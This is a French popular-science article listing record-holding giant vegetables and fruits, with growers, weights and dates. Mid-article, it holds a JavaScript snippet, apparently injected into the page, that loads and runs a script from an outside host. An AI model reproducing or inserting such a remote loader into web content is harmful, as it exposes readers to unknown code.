{"title": "Les 10 plus gros fruits et legumes du monde", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-06-17", "content": "Un peu partout dans le monde, il est des jardiniers tres prolifiques et bienheureux qui, chaque annee, se retrouvent pour disputer les concours des plus gros fruits et legumes. Voici les derniers records homologues. Ils sont tous aussi impressionnants les uns que les autres. Comme chaque annee en septembre depuis le debut du XX e  siecle, des jardiniers de l'extreme se retrouvent a Harrogate, au Royaume-Uni, pour presenter les legumes qu'ils ont cultives tout un ete avec tellement d'amour (et de recettes dont ils ont le secret)... qu'ils sont enormes ! Le  Giant vegetable competition  est un rendez-vous incontournable pour de nombreux Britanniques qui, comme on le sait, sont ferus de jardinage. On peut y voir les plus gros ou les plus longs legumes du royaume, voire du monde ! Depuis les debuts de la competition, plusieurs records mondiaux y ont ete etablis tel celui du plus gros  oignon  (voir plus bas) : 8,47  kg  !  Un peu partout dans le monde, d'autres jardiniers amateurs ou professionnels ont releve le defi. Non seulement du plus gros legume mais aussi du plus gros fruit. Voici 10 d'entre eux, des records homologues tous aussi impressionnants les uns que les autres.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le chou-fleur le plus lourd du monde Son nom est associe a cinq records du monde de gros, tres gros legumes. De la ferme de Peter Glazebrook, situee a Hallam dans le Nottinghamshire, sont sorties les plus longues betteraves au monde, mais aussi les  pommes de terre , oignons et choux-fleurs les plus gros et les plus lourds... Pour ce dernier, c'est un specimen de la variete  Darwin  qui detient le record du plus massif que la Terre ait jamais porte, homologue au Guinness des records : 27,48 kg ! C'est 20 fois le poids ordinaire. Les amateurs de gratin de  chou-fleur  pourraient en manger tous les jours des semaines durant ! Peter Glazebrook detient depuis le 21 avril 2014 le record du monde du plus gros et lourd chou-fleur. (c)  Guinness World Records                               La plus longue carotte du monde Decidement, le Nottinghamshire est une terre fertile ou poussent les plus gros legumes du monde. C'est de ce comte que vient l'interminable  carotte  de Joe Atherton : 6,245 metres de longueur ! Lors de sa presentation au  National Giant Vegetables Championship  de Malvern au Royaume-Uni, le 23 septembre 2016, elle a pulverise le precedent record du monde detenu depuis 2007 avec 5,841 metres. Joe Atherton a cultive la plus longue carotte du monde. Il detient aussi les records de la plus longue betterave et du plus long radis. (c) Joe Atherton,  Malvern's Giant Vegetables Show                               La plus grosse carotte du monde Le record est detenu depuis 2014 par le tres prolifique Pete Glazebrook, jardinier exclusif de legumes geants. Elle pese 9,1 kg ! Pete Glazebrook cumule les records des plus gros legumes du monde. Pesant 9,1 kg, cette carotte detient depuis 2014 le record absolu de la plus grosse. (c) Guinness World Records                               Le plus gros poireau du monde Nous sommes bien sur Terre et non dans un jardin extraterrestre. Avec ses 10,5 kg, ce  poireau  cultive par Paul Rochester bat tous les records. Son secret ? Les recettes transmises par son pere et aussi, affirme-t-il, le  best of  de Glenn Miller qu'il leur fait ecouter toute la journee. Avec ce poireau de 10,5 kg, Paul Rochester a battu le precedent record mondial, 9,75 kg, qu'il detenait. (c) SWNS, Realfix                               Le plus gros oignon du monde Incroyable mais vrai ! Jusqu'en 2014, c'etait Pete Glazebrook qui detenait le record du plus gros et lourd  oignon  du monde mais Tony Glover a fait encore mieux, le battant de peu avec ce specimen de 82 cm dans sa plus grande largeur et pesant 8,47 kg. Il y en a assez pour preparer une soupe a l'oignon pour 36 personnes. Tony Glover pose a cote de l'oignon qu'il a cultive durant 11 mois et qui lui a valu de figurer dans le Guinness. (c) Cascade                               La plus grosse citrouille du monde En 1900, a la Foire internationale de Paris, la plus grosse  citrouille  du monde affichait sur la balance 181 kg. Aujourd'hui, le record du monde detenu par Beni Meier est pour une citrouille de... 1.054 kg ! Surprise : la citrouille la plus lourde jamais cultivee, qui depasse la tonne, ne vient ni des Etats-Unis ni du Canada mais d'Allemagne. (c) Meier, BigPumpkins.com                               Le plus gros radis du monde Il en suffit d'un pour faire une salade pour toute la famille. Les plus gros  radis  jamais cultives proviennent du jardin du Japonais Manabu Oono. Le radis qu'il a presente lors de la  Sakurajima Radish Contest  de 2003, a Kagoshima, conserve le record absolu : une circonference de 119 cm pour un poids de 31,1 kg ! Tres apprecies au Japon, les radis font l'objet d'une competition chaque annee qui recompense, selon les categories, les plus beaux, etonnants, gouteux et aussi les plus gros ! (c) bajiroo.com                               La plus grosse tomate du monde La plus lourde  tomate  jamais produite est americaine. De la variete Big Zac, elle pese 3,81 kg. Dan MacCoy, le jardinier qui l'a cultivee ne s'attendait pas vraiment a battre le precedent record. Les graines, nommees  << 8.41 MacCoy Big Zac >>  (8,41 est son poids en livres), ont ete vendues a des jardiniers francais et britanniques qui esperent obtenir des tomates encore plus grosses pour de futurs concours. Quant au plant de  tomate  le plus long jamais mesure, il mesurait 19,8 metres. Une tomate titan. Dan MacCoy se prepare a la cueillir. (c) Dan MacCoy                               La plus grosse pasteque du monde Depuis octobre 2013, on n'a pas vu de pasteques plus lourdes que celles de Chris Kent : 159 kg sur la balance. Elle fut honoree dans cette categorie lors du festival  Operation Pumpkin , a Hamilton dans l'Ohio. 159 kg a la pesee. Record inegale de la pasteque la plus lourde du monde. (c)  Guinness World Records                               Le plus gros navet du monde Depuis 2004, personne n'a reussi a battre Scott Robb, inscrit au Guinness. Le  navet  qu'il a cultive pesait 17,78 kg. Il ne reste plus qu'a trouver de bonnes recettes pour l'agrementer. Ce navet de pres de 18 kg, record absolu, a ete cultive en Alaska. (c) Scott Robb                               La plus grosse pomme de terre du monde C'est aussi du jardin de Peter Glazebrook que proviennent les plus grosses pommes de terre cultivees du monde. Celle qui fut pesee lors du  National Gardening Show , le 4 septembre 2011, au Royal Bath & West Showground a Shepton Mallet, dans le Somerset, atteignait 4,98 kg. Elle surpasse de plus d'un kg celle qu'il avait presentee l'annee precedente et qui avait decroche le record du monde. Peter Glazebrook, jardinier de tous les records, pose avec sa  pomme de terre  de 5 kg. Elle demeure a ce jour la plus lourde jamais cultivee. (c)  Guinness World Records                               Jardinage : l'entretien des plantes grasses en cinq conseils                       Les plantes succulentes, ou plantes grasses, poussent dans des environnements arides et demandent donc un traitement particulier. La reussite de leur culture et entretien depend du respect de quelques regles simples. Futura-Sciences a interviewe Jean-Marie Solichon, directeur du jardin exotique de Monaco, afin qu'il nous donne quelques conseils.                                       ", "theme": "sante"}